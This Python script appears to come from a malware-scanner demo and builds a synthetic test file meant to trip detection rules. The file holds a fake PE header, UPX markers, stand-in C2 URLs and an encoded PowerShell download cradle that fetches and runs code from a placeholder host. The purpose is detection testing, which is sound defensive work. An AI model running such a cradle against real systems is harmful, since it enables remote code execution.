#!/usr/bin/env python3
"""Deterministically rebuild the 02-deep demo artifact `suspicious_sample.bin`.

The sample is hand-assembled (NO live malware) to trip several YARARUN
detections at once. It is committed to the repo, but this script lets you
regenerate it byte-for-byte and confirm the expected findings.

    python demos/02-deep/build_sample.py            # writes suspicious_sample.bin

Defensive use only.
"""
from __future__ import annotations

import os
import random


def build_sample() -> bytes:
    parts: list[bytes] = []

    # 1) Real MZ + PE header with a wildcarded DOS stub + jump region.
    #    MZ at offset 0 makes uint16(0) == 0x5A4D and filetype == "pe".
    parts.append(b"MZ\x90\x00")
    parts.append(b"\x03\x00\x00\x00\x04\x00\x00\x00")          # 8-byte stub (in [4-64])
    parts.append(b"This program cannot be run in DOS mode.\r\r\n$")
    parts.append(b"\x00" * 8)
    parts.append(b"PE\x00\x00")                                # PE\0\0 follows
    parts.append(b"\x4c\x01\x03\x00")                          # COFF-ish machine/sections

    # 2) UPX packer markers (UPX0 / UPX1 / UPX!).
    parts.append(b"\x00UPX0\x00\x00UPX1\x00\x00UPX!\x00")

    # 3) Encoded PowerShell download-cradle.
    parts.append(
        b"\r\npowershell -nop -w hidden -enc IEX (New-Object Net.WebClient)."
        b"DownloadString('http://stage.example.test/a'); "
        b"[Convert]::FromBase64String($p)\r\n"
    )

    # 4) Two hardcoded C2 URLs + a 16-char .onion fallback (RFC2606 example TLDs).
    parts.append(b"http://cdn.example.test/beacon/1 ")
    parts.append(b"https://api.example.test/checkin ")
    parts.append(b"fallback=abcdefghijklmnop.onion\r\n")

    # 5) Single-byte XOR-encoded copy of MZ + the DOS-mode stub (key 0x5a).
    key = 0x5A
    plain = b"MZThis program cannot be run in DOS mode"
    parts.append(b"\x00\x00")
    parts.append(bytes(b ^ key for b in plain))
    parts.append(b"\x00\x00")

    # 6) ~2 KB high-entropy packed-payload region (deterministic PRNG; no secrets).
    rng = random.Random(1337)
    parts.append(bytes(rng.randrange(256) for _ in range(2048)))

    return b"".join(parts)


def main() -> None:
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "suspicious_sample.bin")
    data = build_sample()
    with open(out, "wb") as fh:
        fh.write(data)
    print(f"wrote {out} ({len(data)} bytes)")


if __name__ == "__main__":
    main()
